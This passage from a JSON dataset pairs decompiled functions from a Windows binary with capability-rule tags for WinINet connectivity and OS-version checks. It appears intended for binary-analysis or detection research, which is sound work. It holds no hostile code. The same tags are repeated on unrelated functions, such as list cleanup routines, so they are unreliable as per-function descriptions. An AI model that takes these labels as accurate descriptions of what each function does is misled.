iVar9 = fcn.0001acb4(&iStack144, 0x30, uVar11, 0);\n        if (iVar9 != 0) goto code_r0x0001f1e7;\n        bVar5 = true;\n    }\n    uVar11 = CONCAT71(uVar11 >> 8, 1);\n    iVar9 = fcn.0001acb4(&iStack160, 0x48, uVar11, 2);\n    if (iVar9 == 0) {\n        bVar3 = true;\n        bVar1 = false;\n        bVar6 = bVar7;\n        if (*(in_stack_00000058 + 0x18) == 0) {\ncode_r0x0001f03a:\n            if (*(in_stack_00000058 + 0x38) == 0) {\ncode_r0x0001f087:\n                iVar9 = (**0x7eb38)(puStack152, arg2, iStack144, arg4, in_stack_00000028, in_stack_00000030, \n                                    in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                    iStack160);\n                if (iVar9 == 0) {\n                    *arg1 = *puStack152;\n                    if ((bVar1) && (*(iStack160 + 0x18) != 0)) {\n                        fcn.0006670a(*(in_stack_00000058 + 0x18), *(iStack160 + 0x18), *(in_stack_00000058 + 0x10));\n                    }\n                    if ((bVar2) && (*(iStack160 + 0x38) != 0)) {\n                        fcn.0006670a(*(in_stack_00000058 + 0x38), *(iStack160 + 0x38), *(in_stack_00000058 + 0x30));\n                    }\n                    if (bVar3) {\n                        *(in_stack_00000058 + 8) = *(iStack160 + 8);\n                        *(in_stack_00000058 + 0x20) = *(iStack160 + 0x20);\n                        *(in_stack_00000058 + 0x28) = *(iStack160 + 0x28);\n                        *(in_stack_00000058 + 0x40) = *(iStack160 + 0x40);\n                    }\n                }\n                bVar4 = bVar3;\n                bVar6 = bVar7;\n                if (bVar2) {\n                    fcn.0001ad2c(uStack128, uStack96);\n                }\n            }\n            else {\n                iVar9 = fcn.0001acb4(&uStack128, *(iStack160 + 0x30), CONCAT71(uVar11 >> 8, 1), 2);\n                bVar4 = true;\n                if (iVar9 == 0) {\n                    bVar2 = true;\n                    *(iStack160 + 0x38) = uStack128;\n                    goto code_r0x0001f087;\n                }\n            }\n            if (bVar1) {\n                fcn.0001ad2c(uStack136, uStack120);\n            }\n            if (!bVar4) goto code_r0x0001f1cb;\n        }\n        else {\n            uVar11 = uVar11 & 0xffffffffffffff00 | 1;\n            iVar9 = fcn.0001acb4(&uStack136, *(iStack160 + 0x10), uVar11, 2);\n            if (iVar9 == 0) {\n                bVar1 = true;\n                *(iStack160 + 0x18) = uStack136;\n                goto code_r0x0001f03a;\n            }\n        }\n        fcn.0001ad2c(iStack160, uStack112);\n    }\ncode_r0x0001f1cb:\n    if (bVar5) {\n        fcn.0001ad2c(iStack144, uStack104);\n    }\n    if (!bVar6) {\n        return iVar9;\n    }\ncode_r0x0001f1e7:\n    fcn.0001ad2c(puStack152, uStack88);\n    return iVar9;\n}\n",
        "token_count": 1475
    },
    "0001f210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001f210(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7eb28 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb28)(arg1, arg2);\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "0001f258": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001f258(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uchar in_R9B;\n    \n    if (*0x7eb00 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb00)(arg1, arg2, arg3, in_R9B);\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "0001f2b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001f2b4(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7eb08 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb08)(arg1, arg2, arg3);\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "0003052c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0003052c(uint64_t *arg1)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = *arg1;\n    if (*0x7eb10 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb10)(uVar3, 0);\n        fcn.0001b3e0(uVar3 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 147
    },
    "0001f350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001f350(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong in_stack_00000028;\n    \n    if (*0x7eb48 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb48)(arg1, arg2, arg3, arg4, in_stack_00000028);\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 161
    },
    "0001fca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001fca8(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong unaff_RDI;\n    ulong noname_3;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong noname_4;\n    ulong in_stack_ffffffffffffffe0;\n    ulong in_stack_ffffffffffffffe8;\n    \n    if (*0x7eab5 != '\\0') {\n        return 0;\n    }\n    fcn.000324cc(0x7eb50);\n    fcn.000324cc(0x7e7f0);\n    iVar1 = fcn.0001c758();\n    if ((iVar1 == 0) && (iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11dc0, 0x1f3b8),  iVar1 == 0)) {\n        fcn.00059140();\n        iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11da0, 0x1f4f8);\n        if (iVar1 == 0) {\n            fcn.00059140();\n            iVar1 = fcn.000307e0();\n            if (0x22 < iVar1) {\n                iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11d80, 0x1e560);\n                if (iVar1 != 0) goto code_r0x0001fe6a;\n                fcn.00059140();\n            }\n            iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11d78, 0x1e314);\n            if (iVar1 == 0) {\n                fcn.00059140();\n                noname_3 = 0x1fc14;\n                noname_4 = 0x7ead8;\n                iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11c40, 0x1fc14);\n                if (iVar1 == 0) {\n                    fcn.00059140(*0x7ead8);\n                    iVar1 = fcn.000550f0(*0x112e0, 0x1e3e0, 0x7eac8, noname_3, noname_4, in_stack_ffffffffffffffe0, \n                                         in_stack_ffffffffffffffe8, unaff_RDI, unaff_RBX, in_stack_00000000, \n                                         in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                         in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                         in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                         in_stack_00000068, in_stack_00000070, in_stack_00000078);\n                    if (iVar1 == 0) {\n                        fcn.00059140(*0x7eac8);\n                        *0x7eab5 = 1;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001fe6a:\n    fcn.0001e11c();\n    return iVar1;\n}\n",
        "token_count": 913
    },
    "0001fe78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001fe78(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong auStackX8 [4];\n    ulong uVar4;\n    \n    if (*0x7eab6 != '\\0') {\n        return 0;\n    }\n    fcn.00018ae4();\n    fcn.000193f0();\n    uVar3 = fcn.00030a40(0x11ae0, auStackX8);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11ea0, 0x7eb18);\n    uVar3 = uVar1;\n    if (uVar1 == 0) {\n        uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e88, 0x7eb28);\n        uVar3 = uVar1;\n        if (uVar1 == 0) {\n            uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e78, 0x7eb20);\n            uVar3 = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e68, 0x7eb00);\n                uVar3 = uVar1;\n                if (uVar1 == 0) {\n                    uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e58, 0x7eb08);\n                    uVar3 = uVar1;\n                    if (uVar1 == 0) {\n                        uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e48, 0x7eb10);\n                        uVar3 = uVar1;\n                        if (uVar1 == 0) {\n                            uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e38, 0x7eb30);\n                            uVar3 = uVar1;\n                            if (uVar1 == 0) {\n                                uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e18, 0x7eb48);\n                                uVar3 = uVar1;\n                                if (uVar1 == 0) {\n                                    iVar2 = fcn.000307e0();\n                                    if (0x1a < iVar2) {\n                                        uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11e00, 0x7eb38);\n                                        uVar3 = uVar1;\n                                        if (uVar1 != 0) goto code_r0x000200e6;\n                                    }\n                                    uVar4 = 0x7eaf0;\n                                    uVar1 = fcn.00055cc0(1, auStackX8[0], 0x11e38, 0x1f9fc);\n                                    uVar3 = uVar1;\n                                    if (uVar1 == 0) {\n                                        fcn.00059140();\n                                        iVar2 = fcn.000307e0();\n                                        if (0x1a < iVar2) {\n                                            uVar4 = 0x7eae8;\n                                            uVar1 = fcn.00055cc0(1, auStackX8[0], 0x11de8, 0x1faec);\n                                            uVar3 = uVar1;\n                                            if (uVar1 != 0) goto code_r0x000200e6;\n                                            fcn.00059140();\n                                        }\n                                        uVar1 = fcn.00055b2c(1, auStackX8[0], 0x11dd0, 0x7eb40, uVar4);\n                                        uVar3 = uVar1;\n                                        if (uVar1 == 0) {\n                                            uVar1 = fcn.00055cc0(1, auStackX8[0], 0x11dd0, 0x1e278);\n                                            uVar3 = uVar1;\n                                            if (uVar1 == 0) {\n                                                fcn.00059140(*0x7eaf8);\n                                                *0x7eab6 = 1;\n                                                return uVar3;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x000200e6:\n    fcn.00059140(*0x7eaf8);\n    fcn.0005540c(0x7eaf8);\n    fcn.00059140(*0x7eae8);\n    fcn.0005540c(0x7eae8);\n    fcn.00059140(*0x7eaf0);\n    fcn.0005540c(0x7eaf0);\n    return uVar3;\n}\n",
        "token_count": 1154
    },
    "000206a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000206a8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg1 != 0) {\n        iVar2 = *(arg1 + 0x38);\n        while (iVar2 != 0) {\n            iVar2 = *(*(arg1 + 0x38) + 0x10);\n            while (iVar2 != 0) {\n                if (*(iVar2 + 0x20) == 0) {\n                    *(arg1 + 0x40) = *(iVar2 + 0x28);\n                }\n                else {\n                    *(*(iVar2 + 0x20) + 0x28) = *(iVar2 + 0x28);\n                }\n                if (*(iVar2 + 0x28) == 0) {\n                    *(arg1 + 0x48) = *(iVar2 + 0x20);\n                }\n                else {\n                    *(*(iVar2 + 0x28) + 0x20) = *(iVar2 + 0x20);\n                }\n                iVar1 = *(iVar2 + 0x18);\n                fcn.00030d24(iVar2);\n                iVar2 = iVar1;\n            }\n            iVar2 = *(arg1 + 0x38);\n            *(arg1 + 0x38) = *(iVar2 + 0x20);\n            fcn.00030d24(iVar2);\n            iVar2 = *(arg1 + 0x38);\n        }\n        *(arg1 + 0x38) = 0;\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "000207cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000207cc(ulong *arg1)\n\n{\n    fcn.0003052c(*arg1);\n    if (*(arg1 + 1) != 0) {\n        fcn.00030378(0x8e8c0);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "000207f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.000207f8(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint *arg1_00;\n    uint32_t *puVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    if (arg1 != 0) {\n        arg1_00 = fcn.00030c98(0x38);\n        if (arg1_00 == NULL) {\n            return 2;\n        }\n        *arg1_00 = arg4;\n        arg1_00[3] = in_stack_00000030;\n        arg1_00[1] = in_stack_00000038;\n        arg1_00[2] = in_stack_00000028;\n        for (puVar3 = *(arg1 + 0x38); (puVar3 != NULL && ((*puVar3 != arg2 || (puVar3[1] != arg3))));\n            puVar3 = *(puVar3 + 8)) {\n        }\n        if ((puVar3 != NULL) || (puVar3 = fcn.0002072c(arg1, arg2, arg3, 0),  puVar3 != NULL)) {\n            if (*(puVar3 + 4) == 0) {\n                *(arg1_00 + 6) = 0;\n                *(arg1_00 + 4) = 0;\n                *(puVar3 + 4) = arg1_00;\n            }\n            else {\n                iVar1 = *(puVar3 + 6);\n                *(iVar1 + 0x18) = arg1_00;\n                *(arg1_00 + 6) = 0;\n                *(arg1_00 + 4) = iVar1;\n            }\n            *(puVar3 + 6) = arg1_00;\n            if (*(arg1 + 0x40) == 0) {\n                *(arg1_00 + 8) = 0;\n                *(arg1_00 + 10) = 0;\n                *(arg1 + 0x40) = arg1_00;\n            }\n            else {\n                *(*(arg1 + 0x48) + 0x28) = arg1_00;\n                uVar2 = *(arg1 + 0x48);\n                *(arg1_00 + 10) = 0;\n                *(arg1_00 + 8) = uVar2;\n            }\n            *(arg1 + 0x48) = arg1_00;\n            *(arg1_00 + 0xc) = puVar3;\n            return 0;\n        }\n        fcn.00030d24(arg1_00);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 620
    },
    "000211a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000211a0(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t arg1_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t aiStackX16 [3];\n    uchar auStack328 [16];\n    uchar auStack312 [8];\n    int32_t iStack304;\n    int32_t iStack268;\n    uchar auStack248 [8];\n    int32_t iStack240;\n    int32_t iStack204;\n    uchar auStack184 [48];\n    uchar auStack136 [72];\n    \n    iVar2 = fcn.00020f54(aiStackX16, arg1, 1, auStack328);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.0006670a(auStack184, aiStackX16[0] + 8, 0x2c);\n    if (*(aiStackX16[0] + 0x20) == 0) {\n        uVar3 = *(aiStackX16[0] + 0xc);\n        if (uVar3 < *(aiStackX16[0] + 0x1c)) {\n            uVar3 = (*(aiStackX16[0] + 0x14) - *(aiStackX16[0] + 0xc)) + -1 + *(aiStackX16[0] + 0x1c);\ncode_r0x00021418:\n            uVar3 = (uVar3 / *(aiStackX16[0] + 0x14)) * *(aiStackX16[0] + 0x14) + *(aiStackX16[0] + 0xc);\n        }\n    }\n    else {\n        (**(*(aiStackX16[0] + 0x58) + 0x38))(*(aiStackX16[0] + 0x60), 2);\n        uVar3 = 0x2c;\n        iVar5 = 0;\n        iVar2 = 0;\n        if (0x2c < *(aiStackX16[0] + 0x1c)) {\n            do {\n                iVar5 = iVar2;\n                iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack312, 0x40, uVar3);\n                if (iVar2 != 0) goto code_r0x00021433;\n                uVar1 = iStack268 + 0x40 + uVar3;\n                if (uVar1 <= uVar3) break;\n                if (iStack304 == 0xffff) {\n                    if (*(aiStackX16[0] + 0x1c) <= uVar1) break;\n                    iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack248, 0x40, uVar1);\n                    if (iVar2 != 0) goto code_r0x00021433;\n                    uVar4 = iStack204 + 0x40;\n                    if (iStack240 == 0xffff) {\n                        iStack268 = iStack268 + uVar4;\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), auStack312);\n                        if (iVar2 != 0) goto code_r0x00021433;\n                    }\n                    else {\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack136, 0x40);\n                        if ((iVar2 != 0) || (arg1_00 = fcn.00030c98(uVar4),  arg1_00 == 0)) goto code_r0x00021433;\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), arg1_00, uVar4, uVar1);\n                        if ((iVar2 != 0) ||\n                           (iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), arg1_00, uVar4, uVar3)\n                           ,  iVar2 != 0)) {\n                            fcn.00030d24(arg1_00);\n                            goto code_r0x00021433;\n                        }\n                        fcn.00030d24(arg1_00);\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), auStack136, 0x40);\n                        if (iVar2 != 0) break;\n                    }\n                }\n                else {\n                    iVar5 = iVar5 + 1;\n                    uVar3 = uVar1;\n                }\n                iVar2 = iVar5;\n            } while (uVar3 < *(aiStackX16[0] + 0x1c));\n        }\n        *(aiStackX16[0] + 0x1c) = uVar3;\n        *(aiStackX16[0] + 0x18) = iVar5;\n        *(aiStackX16[0] + 0x20) = 0;\n        iVar2 = fcn.0006674c(aiStackX16[0] + 8, auStack184, 0x2c, 1, 1);\n        if (iVar2 != 0) {\n            *(aiStackX16[0] + 0x2c) = *(aiStackX16[0] + 0x2c) + 1;\n            iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), aiStackX16[0] + 8, 0x2c);\n            if (iVar2 != 0) {\n                fcn.000206a8(aiStackX16[0]);\n                goto code_r0x00021433;\n            }\n        }\n        fcn.00020a98(aiStackX16[0]);\n        uVar3 = *(aiStackX16[0] + 0xc);\n        if (uVar3 < *(aiStackX16[0] + 0x1c)) {\n            uVar3 = (*(aiStackX16[0] + 0x14) - *(aiStackX16[0] + 0xc)) + -1 + *(aiStackX16[0] + 0x1c);\n            goto code_r0x00021418;\n        }\n    }\n    if (uVar3 != *(aiStackX16[0] + 8)) {\n        fcn.00020c94(aiStackX16[0], uVar3);\n    }\ncode_r0x00021433:\n    (**(*(aiStackX16[0] + 0x58) + 0x38))(*(aiStackX16[0] + 0x60), 1);\n    fcn.000207cc(auStack328);\n    return;\n}\n",
        "token_count": 1648
    },
    "00021644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00021644(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    int32_t *arg2_00;\n    int64_t iStack72;\n    uchar auStack64 [24];\n    \n    uVar2 = fcn.00020f54(&iStack72, arg1, 1, auStack64);\n    if (uVar2 == 0) {\n        if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n            arg2._0_4_ = *(iStack72 + 0x98);\n        }\n        for (arg2_00 = *(iStack72 + 0x38); (arg2_00 != NULL && ((*arg2_00 != arg2 || (arg2_00[1] != arg3))));\n            arg2_00 = *(arg2_00 + 8)) {\n        }\n        fcn.00020948(iStack72, arg2_00, arg4, 1);\n        if ((-1 < *(iStack72 + 0x68)) &&\n           (((uVar1 = *(iStack72 + 0x20),  1 < uVar1 && (*(iStack72 + 0x18) <= uVar1 && uVar1 != *(iStack72 + 0x18))) ||\n            ((*(iStack72 + 0x10) >> 10) / 100 < uVar1)))) {\n            fcn.000211a0(arg1);\n        }\n        fcn.000207cc(auStack64);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 384
    },
    "00021708": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00021708(ulong arg1, int32_t *arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t *arg2_00;\n    int64_t iStackX32;\n    uchar auStack56 [16];\n    \n    arg3 = arg3 & 0xffffffff;\n    uVar2 = fcn.00020f54(&iStackX32, arg1, 1, auStack56);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    if (arg3 != 0) {\n        iVar3 = *arg2;\n        if ((*(iStackX32 + 0x90) != 0) && (iVar3 == *(iStackX32 + 0x94))) {\n            iVar3 = *(iStackX32 + 0x98);\n        }\n        for (arg2_00 = *(iStackX32 + 0x38); (arg2_00 != NULL && ((*arg2_00 != iVar3 || (arg2_00[1] != arg2[2]))));\n            arg2_00 = *(arg2_00 + 8)) {\n        }\n        if (arg3 != 0) {\n            puVar4 = arg2 + 1;\n            do {\n                if (*puVar4 != 0xffffffff) {\n                    fcn.00020948(iStackX32, arg2_00, *puVar4, 2);\n                }\n                puVar4 = puVar4 + 0x10;\n                arg3 = arg3 - 1;\n            } while (arg3 != 0);\n        }\n        fcn.00020788(arg2_00);\n        *(iStackX32 + 0x2c) = *(iStackX32 + 0x2c) + 1;\n        uVar1 = (**(*(iStackX32 + 0x58) + 0x30))();\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x00021802;\n        if ((-1 < *(iStackX32 + 0x68)) &&\n           (((uVar1 = *(iStackX32 + 0x20),  1 < uVar1 && (*(iStackX32 + 0x18) <= uVar1 && uVar1 != *(iStackX32 + 0x18)))\n            || ((*(iStackX32 + 0x10) >> 10) / 100 < uVar1)))) {\n            fcn.000211a0(arg1);\n        }\n    }\n    uVar2 = 0;\ncode_r0x00021802:\n    fcn.000207cc(auStack56);\n    return uVar2;\n}\n",
        "token_count": 630
    },
    "0002199c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0002199c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint32_t *in_stack_00000040;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [36];\n    uint uStack68;\n    int32_t iStack60;\n    \n    if ((in_stack_00000030 == 0) || (in_stack_00000040 == NULL)) {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar3 = fcn.00020f54(&iStack136, arg1, 0, auStack128);\n        if (uVar3 == 0) {\n            if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n                arg2._0_4_ = *(iStack136 + 0x98);\n            }\n            for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n                arg1_00 = *(arg1_00 + 8)) {\n            }\n            uVar1 = fcn.00020914(arg1_00, arg4);\n            if (uVar1 == 0xffffffff) {\n                uVar1 = 5;\n            }\n            else {\n                uVar3 = uVar1;\n                (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, uVar3);\n                uStack68 = fcn.00031204(0);\n                (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, uVar3);\n                if (iStack60 - in_stack_00000028 < in_stack_00000038) {\n                    in_stack_00000038 = iStack60 - in_stack_00000028;\n                }\n                *in_stack_00000040 = in_stack_00000038;\n                iVar2 = (**(*(iStack136 + 0x58) + 0x28))\n                                  (*(iStack136 + 0x60), in_stack_00000030, in_stack_00000038, \n                                   in_stack_00000028 + 0x40 + uVar3);\n                uVar1 = -(iVar2 != 0) & 3;\n            }\n            fcn.000207cc(auStack128);\n            uVar3 = uVar1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 664
    },
    "00021ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
